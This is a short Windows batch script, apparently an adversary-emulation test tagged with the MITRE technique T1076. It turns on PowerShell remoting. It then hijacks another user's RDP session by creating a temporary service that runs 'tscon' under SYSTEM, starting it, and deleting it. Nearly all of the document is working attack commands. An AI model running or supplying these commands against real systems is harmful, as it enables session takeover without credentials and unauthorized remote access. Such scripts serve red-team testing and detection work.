@ECHO OFF
ECHO Enabling remote powershell commands
powershell -command Enable-PSRemoting -Force

ECHO Enabling RDP Session - T1076

query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
net start sesshijack
sc.exe delete sesshijack
